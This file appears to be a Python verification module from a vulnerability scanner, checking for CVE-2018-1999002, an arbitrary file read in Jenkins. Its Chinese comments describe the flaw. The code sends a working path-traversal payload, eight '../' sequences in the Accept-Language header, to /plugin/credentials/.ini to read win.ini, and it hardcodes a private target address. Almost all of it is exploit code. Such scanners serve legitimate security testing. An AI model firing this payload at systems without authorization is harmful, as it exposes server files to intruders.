#!/usr/bin/python3

'''
name: CVE-2018-1999002漏洞
description: CVE-2018-1999002漏洞可任意读取文件,在Linux条件下利用比较困难,则需要一个带有_的目录才能利用
'''

from app.lib.utils.request import request


class CVE_2018_1999002_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.file_name = "windows/win"
        self.BACKDIR_COUNT = 8
        self.header = {
            'Accept-Language': ('../' * self.BACKDIR_COUNT) + self.file_name
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_url =  self.url + '/plugin/credentials/.ini'
            check_req = request.get(check_url, headers = self.header)
            if "MPEGVideo" in check_req.text and check_req.status_code == 200:
                print('存在CVE-2018-1999002漏洞')
                return True
            else:
                print('不存在CVE-2018-1999002漏洞')
                return False
        except Exception as e:
            #print(e)
            print('不存在CVE-2018-1999002漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2018_1999002 = CVE_2018_1999002_BaseVerify('http://10.4.69.55:8789')
    CVE_2018_1999002.run()



